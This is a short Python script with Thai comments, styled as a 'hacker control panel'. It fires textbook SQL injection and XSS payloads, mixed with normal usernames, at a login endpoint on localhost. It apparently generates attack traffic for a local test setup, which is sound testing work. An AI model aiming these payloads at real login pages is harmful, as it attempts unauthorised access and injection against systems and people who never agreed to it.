import requests
import time
import random
import urllib.parse

# เป้าหมาย
TARGET_URL = "http://127.0.0.1:8080/login"

# 1. SQL Injection (ยิงใส่ User)
sqli_payloads = [
    "' OR '1'='1",
    "admin' OR 1=1 --",
    "' OR 1=1 #",
    "UNION SELECT 1,2,3 --",
    "'; WAITFOR DELAY '0:0:5'--",
    "SELECT version()",
    "admin') OR ('1'='1"
]

# 2. XSS Attack (ยิงใส่ User เหมือนกัน!)
xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "jaVasCript:alert(1)"
]

# 3. Normal User
normal_users = [
    "somchai", "somsri", "admin", "guest", "pranee", "manop"
]

def send_request(user_input, password="123", type_name="Normal"):
    try:
        # ส่ง Request
        response = requests.get(TARGET_URL, params={'user': user_input, 'pass': password}, timeout=2)
        status = response.status_code
        print(f"🚀 Sent [{type_name}]: {user_input[:40]}... (Status: {status})")
    except Exception as e:
        print(f"❌ Error: {e}")

def attack():
    while True:
        print("\n😈 === HACKER CONTROL PANEL ===")
        print("1. 🟢 ยิงแบบคนดี (Normal)")
        print("2. 🔥 ยิง SQL Injection")
        print("3. ☠️ ยิง XSS Attack")
        print("4. 💣 Auto Attack (รัวๆ)")
        
        choice = input("Select: ")

        if choice == '1':
            user = random.choice(normal_users)
            send_request(user, "1234", "Normal")

        elif choice == '2':
            payload = random.choice(sqli_payloads)
            send_request(payload, "1234", "SQLi")

        elif choice == '3':
            # 🔥 แก้ตรงนี้: เอา Payload ยัดใส่ช่อง user (ตัวหน้า) แทน
            payload = random.choice(xss_payloads)
            send_request(payload, "1234", "XSS") # <--- ใส่ payload เป็นตัวแรก

        elif choice == '4':
            print("💣 Auto Mode (Ctrl+C to stop)...")
            try:
                while True:
                    mode = random.choices(['normal', 'sqli', 'xss'], weights=[40, 30, 30], k=1)[0]
                    if mode == 'normal':
                        send_request(random.choice(normal_users), "1234", "Normal")
                    elif mode == 'sqli':
                        send_request(random.choice(sqli_payloads), "1234", "SQLi")
                    elif mode == 'xss':
                        # 🔥 แก้ตรงนี้ด้วย: ใส่ payload ช่องแรก
                        send_request(random.choice(xss_payloads), "1234", "XSS")
                    
                    time.sleep(1.5)
            except KeyboardInterrupt:
                print("\n🛑 Stop!")
        else:
            print("เลือกใหม่ครับพี่!")

if __name__ == "__main__":
    attack()